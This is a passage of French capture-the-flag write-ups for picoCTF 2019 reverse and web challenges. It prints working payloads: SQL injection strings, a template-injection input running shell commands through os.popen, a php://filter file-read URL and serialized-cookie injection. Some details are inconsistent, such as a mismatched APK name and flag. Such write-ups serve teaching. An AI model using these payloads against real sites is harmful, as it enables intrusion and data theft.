  }
  return;
}
```

Nous allons utiliser `radare2` pour débugger notre binaire, le but sera de changer le comportement de la fonction `calculate_key(void)` afin de na pas perdre de temps pendant l'exécution.

```assembly
$ r2 -dA need-for-speed 
> s sym.calculate_key
> pdf
> db 0x563b98854845
> dc
Keep this thing over 50 mph!
============================

Creating key...
hit breakpoint at: 563b98854845
> pdf
0x563b98854841      55             push rbp
0x563b98854842      4889e5         mov rbp, rsp
;-- rip:
0x563b98854845 b    c745fc78e5f7.  mov dword [local_4h], 0xd1f7e578
0x563b9885484c      836dfc01       sub dword [local_4h], 1
0x563b98854850      817dfcbcf2fb.  cmp dword [local_4h], 0xe8fbf2bc
0x563b98854857      75f3           jne 0x563b9885484c
0x563b98854859      8b45fc         mov eax, dword [local_4h]
0x563b9885485c      5d             pop rbp
0x563b9885485d      c3             ret
> afvd
var local_4h = 0x7ffdb081091c  0xb08109300000563b   ;V..0...
> afvd local_4h
pxr $w @rbp-0x4
> wx 0xe8fbf2bc @ rbp-0x4
> afvd
var local_4h = 0x7ffdb081091c  0xb0810930bcf2fbe8   ....0...
> dc
child stopped with signal 14
[+] SIGNAL 14 errno=0 addr=0x00000000 code=128 ret=0
hit breakpoint at: 563b98854845
[+] signal 14 aka SIGALRM received 0
> dc

Finished
Printing flag:
PICOCTF{Good job keeping bus #2eaa9f42 speeding along!}
```

Nous ajoutons un breakpoint et on modifie la valeur de `local_4h`.

`PICOCTF{Good job keeping bus #2eaa9f42 speeding along!}`

# reverse_400_times_up

------

### Titre : Time's Up

### Points : 400

------

### Description

------

Time waits for no one. Can you solve this before time runs out? times-up, located in the directory at /problems/time-s-up_6_480d53541469436212e30dad5b4ce691.

#### Hints

* Can you interact with the program using a script?

------

### Résolution

---

```bash
$ file times-up 
times-up: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=578bcd6434fc9bd11298e7fef6e2902881cc0aa9, not stripped
```

```bash
$ ./times-up 
Challenge: (((((1032183956) + (1878807778)) + ((225381224) + (1179303096))) - (((1045422336) + (139966371)) + ((1989694838) - (2085101076)))) + ((((1848464302) + (2061365002)) + ((982301632) + (1345392744))) + (((-996389106) + (1165844304)) + ((-2065118412) - (1569134458)))))
Setting alarm...
Solution? Alarm clock

$ ./times-up 
Challenge: (((((-564505372) + (-265076648)) - ((-1588598789) + (-677091508))) - (((1385700842) + (-226168746)) + ((-1254715774) + (-1502038778)))) + ((((-218273796) + (-1183636487)) - ((-1478479326) + (-1458546544))) - (((1876126944) + (730593023)) + ((-605076252) - (-324856014)))))
Setting alarm...
Solution? Alarm clock
```

```c
undefined8 main(void) {
  init_randomness();
  printf("Challenge: ");
  generate_challenge();
  putchar(10);
  fflush(stdout);
  puts("Setting alarm...");
  fflush(stdout);
  ualarm(5000,0);
  printf("Solution? ");
  __isoc99_scanf(&DAT_00100e68,&guess);
  if (guess == result) {
    puts("Congrats! Here is the flag!");
    system("/bin/cat flag.txt");
  }
  else {
    puts("Nope!");
  }
  return 0;
}
```

```c
void init_randomness(void) {
  int rand1;
  int rand2;
  int rand3;
  time_t current_time;
  
  current_time = time(NULL);
  srand((uint)current_time);
  rand1 = rand();
  rand2 = rand();
  rand3 = rand();
  seed = (long)(rand3 + rand1 * rand2);
  return;
}
```

Pour résoudre ce challenge nous devons rapidement calculer l'équation du programme. Ce dernier se bassant sur `time(NULL)`, les randoms sont alors prédictables.

Pour résoudre le challenge nous alons simuler une exécution dans le futur, changer la valeur de `time(NULL)` en valeur plus haute (nous pouvons utiliser un débugger comme `radare2` afin de placer un breakpoint puis de changer la valeur utilisée par le programme).

```bash
$ for i in `seq 20`; do ./times-up <<< 2637658868 ; done
...
Challenge: (((((-525414656) + (1028030560)) + ((792839653) + (1470238638))) - (((-1347283975) + (1163814534)) + ((908858000) + (68117937)))) + ((((-1952885388) - (-1041361602)) + ((1370964930) + (-62900633))) + (((617188784) + (-649058860)) + ((-800929568) + (1101730302)))))
Setting alarm...
Solution? Congrats! Here is the flag!
picoCTF{Gotta go fast. Gotta go FAST. #1626a7fb}
```

Nous allons ensuite sur le serveur qui possède le `flag.txt` afin de lui donner la bon résultat.

`picoCTF{Gotta go fast. Gotta go FAST. #1626a7fb}`

# reverse_450_droids3

------

### Titre : droids3

### Points : 450

------

### Description

------

Reverse the pass, patch the file, get the flag. Check out this file. You can also find the file in /problems/droids4_0_99ba4f323d3d194b5092bf43d97e9ce9.

#### Hints

* 

------

### Résolution

---

```bash
$ file three.apk 
three.apk: Zip archive data, at least v1.0 to extract
```

Nous allons utiliser `jadx` pour reverser notre `apk`.

```java
// MainActivity
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView((int) C0272R.layout.activity_main);
    this.text_top = (TextView) findViewById(C0272R.C0274id.text_top);
    this.text_bottom = (TextView) findViewById(C0272R.C0274id.text_bottom);
    this.text_input = (EditText) findViewById(C0272R.C0274id.text_input);
    this.ctx = getApplicationContext();
    System.loadLibrary("hellojni");
    this.text_top.setText(C0272R.string.hint);
}

public void buttonClick(View view) {

    this.text_bottom.setText(FlagstaffHill.getFlag(this.text_input.getText().toString(), this.ctx));
}
```

```java
// FlagstaffHill
public static native String cilantro(String str);

public static String nope(String input) {
    return "don't wanna";
}

public static String yep(String input) {
	return cilantro(input);
}

public static String getFlag(String input, Context ctx) {
	return nope(input);
}
```

On peut voir que `getFlag()` appelle `nope(input)`, alors que nous voulons appeler `yep(input)`. Nous allons essayer de patcher notre `apkt` en éditant le code smali.

```bash
$ cp -r three three_patched
# avant
$ cat three/smali/com/hellocmu/picoctf/FlagstaffHill.smali
.method public static getFlag(Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;                                                    
.locals 1                                                                                                                                   
.param p0, "input"    # Ljava/lang/String;                                                                                                  
.param p1, "ctx"    # Landroid/content/Context;                                                                                             

.line 19                                                                                                                                    
invoke-static {p0}, Lcom/hellocmu/picoctf/FlagstaffHill;->nope(Ljava/lang/String;)Ljava/lang/String;                                        

move-result-object v0

.line 20
.local v0, "flag":Ljava/lang/String;
return-object v0
.end method

# après
$ cat three_patched/smali/com/hellocmu/picoctf/FlagstaffHill.smali
.method public static getFlag(Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;
.locals 1
.param p0, "input"    # Ljava/lang/String;
.param p1, "ctx"    # Landroid/content/Context;

.line 19
invoke-static {p0}, Lcom/hellocmu/picoctf/FlagstaffHill;->yep(Ljava/lang/String;)Ljava/lang/String; # on change ici

move-result-object v0

.line 20
.local v0, "flag":Ljava/lang/String;
return-object v0
.end method
```

```bash
# avant
>nope(Ljava/lang/String;)Ljava/lang/String;   
# après
>yep(Ljava/lang/String;)Ljava/lang/String;
```

Nous avons patcher notre smali. nous devons maintenant reconstituer notre apk.

```bash
# créer apk
$ java -jar ~/tools/apktool_2.4.0.jar b three_patched/ -o three_patched.apk
$ file three_patched.apk 
three_patched.apk: Zip archive data, at least v2.0 to extract

# crée clé pour signer
$ keytool -genkeypair -v -keystore key.keystore -alias publishingdoc -keyalg RSA -keysize 2048 -validity 10000

# signer
$ jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore ./key.keystore three_patched.apk publishingdoc
...
>>> Signer
    X.509, CN=a, OU=a, O=a, L=a, ST=a, C=FR
    [trusted certificate]

jar signed.

Warning: 
The signer's certificate is self-signed.
```

```bash
$ adb devices
List of devices attached
emulator-5558   device

# si besoin
$ adb uninstall com.hellocmu.picoctf 
Success
```

```bash
$ adb install three_patched.apk 
Success
```

Cela nous permet de récupérer le flag.

`picoCTF{tis.but.a.scratch}`

# reverse_500_droids4

------

### Titre : droids4

### Points : 500

------

### Description

------

Reverse the pass, patch the file, get the flag. Check out this file. You can also find the file in /problems/droids4_0_99ba4f323d3d194b5092bf43d97e9ce9.

#### Hints

* 

------

### Résolution

---

```bash
$ file four.apk 
three.apk: Zip archive data, at least v1.0 to extract
```

Nous allons utiliser `jadx` pour reverser notre `apk`.

```java
// MainActivity
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView((int) C0272R.layout.activity_main);
    this.text_top = (TextView) findViewById(C0272R.C0274id.text_top);
    this.text_bottom = (TextView) findViewById(C0272R.C0274id.text_bottom);
    this.text_input = (EditText) findViewById(C0272R.C0274id.text_input);
    this.ctx = getApplicationContext();
    System.loadLibrary("hellojni");
    this.text_top.setText(C0272R.string.hint);
}

public void buttonClick(View view) {
this.text_bottom.setText(FlagstaffHill.getFlag(this.text_input.getText().toString(), this.ctx));
    }
```

```java
// FlagstaffHill
public static native String cardamom(String str);

public static String getFlag(String input, Context ctx) {
    String str = "aaa";
    StringBuilder ace = new StringBuilder(str);
    StringBuilder jack = new StringBuilder(str);
    StringBuilder queen = new StringBuilder(str);
    StringBuilder king = new StringBuilder(str);
    ace.setCharAt(0, (char) (ace.charAt(0) + 4));
    ace.setCharAt(1, (char) (ace.charAt(1) + 19));
    ace.setCharAt(2, (char) (ace.charAt(2) + 18));
    jack.setCharAt(0, (char) (jack.charAt(0) + 7));
    jack.setCharAt(1, (char) (jack.charAt(1) + 0));
    jack.setCharAt(2, (char) (jack.charAt(2) + 1));
    queen.setCharAt(0, (char) (queen.charAt(0) + 0));
    queen.setCharAt(1, (char) (queen.charAt(1) + 11));
    queen.setCharAt(2, (char) (queen.charAt(2) + 15));
    king.setCharAt(0, (char) (king.charAt(0) + 14));
    king.setCharAt(1, (char) (king.charAt(1) + 20));
    king.setCharAt(2, (char) (king.charAt(2) + 15));
    
    if (input.equals("".concat(queen.toString()).concat(jack.toString()).concat(ace.toString()).concat(king.toString()))) {
        return "call it";
    }
    return "NOPE";
}
```

On peut voir que `getFlag()` réalise plusieurs calculs pour comparer notre input. Nous avons juste à exécuter ce même code.

```java
class Test {

  public static void main(String[] args){
      
      String str = "aaa";
      StringBuilder ace = new StringBuilder(str);
      StringBuilder jack = new StringBuilder(str);
      StringBuilder queen = new StringBuilder(str);
      StringBuilder king = new StringBuilder(str);
      ace.setCharAt(0, (char) (ace.charAt(0) + 4));
      ace.setCharAt(1, (char) (ace.charAt(1) + 19));
      ace.setCharAt(2, (char) (ace.charAt(2) + 18));
      jack.setCharAt(0, (char) (jack.charAt(0) + 7));
      jack.setCharAt(1, (char) (jack.charAt(1) + 0));
      jack.setCharAt(2, (char) (jack.charAt(2) + 1));
      queen.setCharAt(0, (char) (queen.charAt(0) + 0));
      queen.setCharAt(1, (char) (queen.charAt(1) + 11));
      queen.setCharAt(2, (char) (queen.charAt(2) + 15));
      king.setCharAt(0, (char) (king.charAt(0) + 14));
      king.setCharAt(1, (char) (king.charAt(1) + 20));
      king.setCharAt(2, (char) (king.charAt(2) + 15));
      System.out.println("".concat(queen.toString()).concat(jack.toString()).concat(ace.toString()).concat(king.toString()));
  }
}
```

```bash
$ java main.java
alphabetsoup
```

Nous devons alors fournir `alphabetsoup` comme input pour rentrer dans la condition.

Notre objectif est d'appeler la fonction `cardamom()` pour obtenir le flag.

```java
public class FlagstaffHill {
    public static native String cardamom(String str);

    public static String getFlag(String input, Context ctx) {
        return cardamom(input);
    }
}
```

Nous devons éditer le smali de la classe `FlagstaffHill` pour réaliser un appel à `cardamon(input)`, depuis `getFlag()`.

Après avoir patché notre smali, nous devons reconstruire notre apk.

```bash
# créer apk
$ java -jar ~/tools/apktool_2.4.0.jar b four_patched/ -o four_patched.apk
$ file four_patched.apk 
four_patched.apk: Zip archive data, at least v2.0 to extract

# crée clé pour signer
$ keytool -genkeypair -v -keystore key.keystore -alias publishingdoc -keyalg RSA -keysize 2048 -validity 10000

# signer
$ jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore ./key.keystore three_patched.apk publishingdoc
...
>>> Signer
    X.509, CN=a, OU=a, O=a, L=a, ST=a, C=FR
    [trusted certificate]

jar signed.

Warning: 
The signer's certificate is self-signed.
```

```bash
$ adb devices
List of devices attached
emulator-5558   device

# si besoin
$ adb uninstall com.hellocmu.picoctf 
Success
```

```bash
$ adb install four_patched.apk 
Success
```

Cela nous permet de récupérer le flag.

`picoCTF{tis.but.a.scratch}`

# web_100_dont-use-client-side

------

### Titre : dont-use-client-side

### Points : 100

------

### Description

------

Can you break into this super secure portal?

------

### Résolution

---

```js
split = 4;
if (checkpass.substring(0, split) == 'pico')
if (checkpass.substring(split*6, split*7) == '4454')
if (checkpass.substring(split, split*2) == 'CTF{')
if (checkpass.substring(split*4, split*5) == 'ts_p')
if (checkpass.substring(split*3, split*4) == 'lien')
if (checkpass.substring(split*5, split*6) == 'lz_2')
if (checkpass.substring(split*2, split*3) == 'no_c')
if (checkpass.substring(split*7, split*8) == 'a}')
```

après un peu de nettoyage => 

```js
if (checkpass.substring(0, 4) == 'pico')
if (checkpass.substring(4,8) == 'CTF{')
if (checkpass.substring(8, 12) == 'no_c')
if (checkpass.substring(12, 16) == 'lien')
if (checkpass.substring(16, 20) == 'ts_p')
if (checkpass.substring(20, 24) == 'lz_2')
if (checkpass.substring(24, 28) == '4454') 
if (checkpass.substring(28, 32) == 'a}')
```

`picoCTF{no_clients_plz_24454a}`

# web_100_where_are_the_robots

------

### Titre : where are the robots

### Points : 100

------

### Description

------

Can you find the robots?

------

### Résolution

---

Récup le fichier robots.txt & recup l'url caché  

```bash
$ curl https://2019shell1.picoctf.com/problem/47235/robots.txt
User-agent: *
Disallow: /54e98.html
$ curl https://2019shell1.picoctf.com/problem/47235/54e98.html
<!doctype html>
<html>
  <head>
    <title>Where are the robots</title>
    <link href="https://fonts.googleapis.com/css?family=Monoton|Roboto" rel="stylesheet">
    <link rel="stylesheet" type="text/css" href="style.css">
  </head>
  <body>
    <div class="container">
      
      <div class="content">
	<p>Guess you found the robots<br />
	  <flag>picoCTF{ca1cu1at1ng_Mach1n3s_54e98}</flag></p>
      </div>
      <footer></footer>
  </body>
</html>
```

`picoCTF{ca1cu1at1ng_Mach1n3s_54e98}`


# web_200_client-side-again

------

### Titre : client-side-again

### Points : 200

------

### Description

------

Can you break into this super secure portal?

------

### Résolution

---

On a du js obfusquée :  

```js
if (checkpass[_0x4b5b('0x2')](0x0, split * 0x2) == _0x4b5b('0x3')) {
if (checkpass[_0x4b5b('0x2')](0x7, 0x9) == '{n') {
if (checkpass[_0x4b5b('0x2')](split * 0x2, split * 0x2 * 0x2) == _0x4b5b('0x4')) {
if (checkpass[_0x4b5b('0x2')](0x3, 0x6) == 'oCT') {
if (checkpass[_0x4b5b('0x2')](split * 0x3 * 0x2, split * 0x4 * 0x2) == _0x4b5b('0x5')) {
if (checkpass['substring'](0x6, 0xb) == 'F{not') {
if (checkpass[_0x4b5b('0x2')](split * 0x2 * 0x2, split * 0x3 * 0x2) == _0x4b5b('0x6')) {
if (checkpass[_0x4b5b('0x2')](0xc, 0x10) == _0x4b5b('0x7')) {
```

une fois un peu analysé on retrouve facilement des indices et les valeurs du flag :  

```js
if (checkpass[_0x4b5b('0x2')](0, 8) == 'picoCTF{') {
if (checkpass[_0x4b5b('0x2')](3, 6) == 'oCT') {
if (checkpass[_0x4b5b('0x2')](7, 9) == '{n') {
if (checkpass['substring'](6, 11) == 'F{not') {
if (checkpass[_0x4b5b('0x2')](8, 16) == 'not_this') {
if (checkpass[_0x4b5b('0x2')](12, 16) == 'this') {
if (checkpass[_0x4b5b('0x2')](16, 24) == '_again_a') {
if (checkpass[_0x4b5b('0x2')](24, 32) == 'd9590}') {
```

`picoCTF{not_this_again_ad9550}`


# web_250_open-to-admins

------

### Titre : Open to admins

### Points : 250

------

### Description

------

This secure website allows users to access the flag only if they are **admin** and if the **time** is exactly 1400.

------

### Résolution

---

Il faut faire un GET sur /flag avec 2 cookies : admin=true & time=1400

```bash
$ curl -b 'admin=true; time=1400;' https://2019shell1.picoctf.com/problem/47265/flag |grep picoCTF
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1340  100  1340    0     0   2557      0 --:--:-- --:--:-- --:--:--  2552
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{0p3n_t0_adm1n5_00cd0fe1}</code></p>
```

NULLLLL!!!!

`picoCTF{0p3n_t0_adm1n5_00cd0fe1}`

# web_400_Empire1

------

### Titre : Challenge name

### Points : 400

------

### Description

------

Psst, Agent 513, now that you're an employee of Evil Empire Co., try to get their secrets off the company website. `https://2019shell1.picoctf.com/problem/12234/` ([link](https://2019shell1.picoctf.com/problem/12234/)) Can you first find the secret code they assigned to you?

------

### Résolution

---

Blind SQL injection ....  
Si notre injection est bonne alors le derniere élément de `/list_items` sera 1 sinon 0.  
(pour plus de détail voir script.py dispo sur git.riviere-r.fr)  

Exemple de payload : 
`"' or sqlite_version()!=sqlite_version() and '2'='2"` ==> O  
`"' or sqlite_version()==sqlite_version() and '2'='2"` ==> 1  

`picoCTF{wh00t_it_a_sql_inject46527b2c}`



# web_400_Irish-Name-Repo_3

------

### Titre : Irish-Name-Repo 3

### Points : 400

------

### Description

------

There is a secure website running at `https://2019shell1.picoctf.com/problem/47247/` ([link](https://2019shell1.picoctf.com/problem/47247/)) or http://2019shell1.picoctf.com:47247. Try to see if you can login as admin!  

------

### Résolution

---

Objectif de ce challenge : Se connecter en tant qu'admin.  
En analysant les données envoyés on voit une variable debug à 0 donc on va la mettre à 1 pour mieux comprendre ce qu'il se passe.  
On va essayer de bypass le mot de passe : `a' or 1=1 --`  

```bash
$ python3 script.py 
<pre>password: a' or 1=1 --
SQL query: SELECT * FROM admin where password = 'n' be 1=1 --'
</pre>
```

Visiblement le o a été remplacer par le b,  le r par e, et le a par le n...  

```bash
$ python3 script.py
<pre>password: abcdefghijklmnopqrstuvwxyz' or 1=1 --
SQL query: SELECT * FROM admin where password = 'nopqrstuvwxyzabcdefghijklm' be 1=1 --'
</pre>
```

on va donc remplacer le mot clé `or` par `be` :  

```bash
$ python3 script.py 
<pre>password: a' be 1=1 --
SQL query: SELECT * FROM admin where password = 'n' or 1=1 --'
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{3v3n_m0r3_SQL_c2c37f5e}</p>
```

`picoCTF{3v3n_m0r3_SQL_c2c37f5e}`



# web_400_Java_Script_Kiddie

------

### Titre : Java Script Kiddie

### Points : 400

------

### Description

------

The image link appears broken... 

------

### Résolution

---

On arrive sur la page avec un input, vu le titre le challenge va principalement basé sur du javascript.
On va donc récup le js et l'analyser :  

```javascript
var bytes = [];

bytes='137 [...] 188'
bytes = Array.from(bytes.split(" "), x => Number(x));

function assemble_png() {
    
    u_in=process.argv[2]; //j'ai utilisé nodejs en commandline
    var LEN = 16;
    var key = "0000000000000000";
    var shifter;
    if (u_in.length == LEN) {
        key = u_in;
    }
    var result = [];
    
    for (var i = 0; i < LEN; i++) {
        shifter = key.charCodeAt(i) - 48;
        for (var j = 0; j < (bytes.length / LEN); j++) {

            result[(j * LEN) + i] = bytes[ ( ( (j + shifter) * LEN) % bytes.length) + i];
        }
    }
    while (result[result.length - 1] == 0) {
        result = result.slice(0, result.length - 1);
    }
    const fs = require('fs');
    fs.writeFile('out.png', new Buffer(result));
    return false;
}

assemble_png()
```

Le js va créer une image PNG depuis une liste de bytes. Cependant cette liste est mélanger selon clé qu'on ignore. Le but va être de retrouver cette clé pour ensuite retrouver l'image.
Mais comment retrouver la clé .... la seule chose que l'on connait est le début des PNG qui est tout le temps le même (que je vais bientôt connaître par cœur :/) `89 50 4E 47 0D 0A 1A 0A 00 00 00 0D 49 48 44 52` . Essayons une attaque par clair connue.  

```js
for (var i = 0; i < LEN; i++) {
        shifter = key.charCodeAt(i) - 48;
        for (var j = 0; j < (bytes.length / LEN); j++) {
            result[(j * LEN) + i] = bytes[ ( ( (j + shifter) * LEN) % bytes.length) + i];
        }
    }
```

Au premier tour de la boucle  
i=0  
j=0  
shifter = key[i] -48  <= ce qu'on veut trouver  
result[ (0\*16) +0 ] = bytes[ ( ( (0+shifter)\*16  )%bytes.length )+0 ]  
==> result[ 0 ] = bytes[ ( (shifter)\*16  )%bytes.length  ]  
& on sait qu'a l'indice 0 de notre tableau on doit avoir la valeur 0x89 (137 en décimal)  
On va ensuite chercher les indices de la valeur 137 dans notre variable bbytes et on peut le retrouver à l'indice 0  
( (shifter)\*16  )%bytes.length==0  
0 = key.charcodeAt(0) -48 donc la première valeur de notre clé vaut 48 en décimal donc en ASCII : '0'  
Si jamais l'indice de la valeur n'est pas divisible par 16 on prendra le prochain indice de cette valeur.  

Bon on va pas tous les faire à la main donc il est temps de scripter ! =)  

```python
bbytes='137 [...] 188'
findHeader=[0x89,0x50,0x4E,0x47,0x0D,0x0A,0x1A,0x0A,0x00,0x00,0x00,0x0d,0x49,0x48,0x44,0X52]
bbytes=[int(i) for i in bbytes.split(" ")]
for i in range(0,16):
    j=0
    while 1:
        indice=bbytes.index(findHeader[i],j)
        rep=(indice-i)/16        
        if rep.is_integer():
            break
        else:
            j+=1
    print(chr(int(rep+48)),end='')
print()
```

Et on obtient `0050909173522752`  
Miracle on a notre clé !   

```bash
$ nodejs decode.js 0050909173522752
$ file out.png
out.png: PNG image data, 370 x 370, 1-bit grayscale, non-interlaced
$ zbarimg out.png 
QR-Code:picoCTF{fd96e1233ac9b02bfb217cd706dfbdcd}
```

`picoCTF{fd96e1233ac9b02bfb217cd706dfbdcd}`


# web_450_Empire2

------

### Titre : Empire 2

### Points : 450

------

### Description

------

Well done, Agent 513! Our sources say Evil Empire Co is passing secrets around when you log in: `https://2019shell1.picoctf.com/problem/10833/`, can you help us find it?

------

### Résolution

---

On essaye de rajouter une card avec **\{\{1+1\}\}** et on voit 2 => c'est donc une ssti.
On va essayer maintenant de voir les fichiers du dossier courant :  

Payload : **\{\{url_for.__globals__.os.popen("ls -R *").read()\}\}**
```bash
server.py
xinet_startup.sh

app:
__init__.py
config.py
helpers.py
models.py
routes.py
templates

app/templates:
404.html
base.html
create.html
employee.html
index.html
list.html
login.html
register.html
```

On va essayer de lire le fichier app/config.py :
**\{\{url_for.__globals__.os.popen("cat app/config.py").read()\}\}** pb il renvoie renvoie rien ... On va essayer différente commande bash et :  

```bash
...
@app.route('/list_items',methods=['GET']) app/routes.py:@login_required app/routes.py:def list_items(): app/routes.py: session['dark_secret'] = "picoCTF{its_a_me_your_flagf3d56a8a}" ...
```

`picoCTF{its_a_me_your_flagf3d56a8a}`

# web_450_Java_Script_Kiddie_2

------

### Titre : Java Script Kiddie 2

### Points : 450

------

### Description

------

The image link appears broken...twice as badly...

------

### Résolution

---

Le challenge est très similaire à la première version avec quelque modification : 
La clé est deux fois plus longue : `var key = "00000000000000000000000000000000";`  mais 
on ne récupère qu'un élément sur deux : `shifter = Number(key.slice((i * 2), (i * 2) + 1));`  

Mais rien d'autre ne change donc on a juste à réutiliser notre script précédent mais rajouter une valeur random après chaque vrai valeur : `print(int(rep),end='X')`  

```bash
$ python3 script.py 
2X0X0X2X6X7X4X5X2X2X6X2X3X2X7X0X
$ nodejs decode.js 2X0X0X2X6X7X4X5X2X2X6X2X3X2X7X0X
$ file out.png
out.png: PNG image data, 370 x 370, 1-bit grayscale, non-interlaced
$ zbarimg out.png 
QR-Code:picoCTF{7f2c51c50024c7d3b44595bc61f5d6a8}
scanned 1 barcode symbols from 1 images in 0.16 seconds
```

`picoCTF{7f2c51c50024c7d3b44595bc61f5d6a8}`


# web_450_cereal_hacker_1

------

### Titre : cereal hacker 1

### Points : 450

------

### Description

------

Login as admin.

------

### Résolution

---

Objectif : se connecter en tant qu'admin, on check les cookies on a un objet linéarisée.
On le modifie pour mettre notre payload dedans et le tour est joué .
C'est une injection SQL classique : `' or '1'='1`  

```bash
python3 script.py |grep picoCTF
<h5 style="color:blue" class="text-center">Flag: picoCTF{41f9ada4385bd93a3b15eead30841230}</h5>
```

`picoCTF{41f9ada4385bd93a3b15eead30841230}`


# web_500_Empire3

------

### Titre : Empire 3

### Points : 500

------

### Description

------

Agent 513! One of your dastardly colleagues is laughing very sinisterly! Can you access his todo list and discover his nefarious plans?  

------

### Résolution

---

Les payloads fonctionnent exactement comme empire2...  

`picoCTF{cookies_are_a_sometimes_food_ca3aaf8b}`



# web_500_cereal_hacker_2

------

### Titre : cereal hacker 2

### Points : 500

------

### Description

------

Get the admin's password.

------

### Résolution

---

On arrive sur une page de login, on remarque que dans l'url on a file=login ... Peut-être une LFI possible ?  

`https://2019shell1.picoctf.com/problem/62195/index.php?file=php://filter/convert.base64-encode/resource=login`
Ça fonctionne ! On va essayer donc pouvoir récupérer tous le code du site web =).  

Deuxième étape, trouver un moyen de récupérer le mot de passe de l'admin. En lisant le code on trouve une vulnérabilité dans le fichier cookie.php  

```php
$perm = unserialize(base64_decode(urldecode($_COOKIE['user_info'])));
```

Un objet est délinéarisée, cependant il ne vérifie pas l'objet qui est créer. On va donc créer un objet de type siteuser, pour faire une injection sql.
On va faire une blind sql injection pour retrouver d'abord la longueur du mot de passe de l'administrateur, puis récupérer lettre par lettre le mot de passe.  

```bash
python3 script.py 
[+] longueur du password : 41 or password='
[+] p
[+] pi
[+] pic
[+] pico
[+] picoc
[+] picoct
[+] picoctf
[+] picoctf{
[+] picoctf{c
[+] picoctf{c9
...
[+] picoctf{c9f6ad462c6bb64a53c6e7a6452a6eb7
[+] picoctf{c9f6ad462c6bb64a53c6e7a6452a6eb7}
```


`picoCTF{c9f6ad462c6bb64a53c6e7a6452a6eb7}`

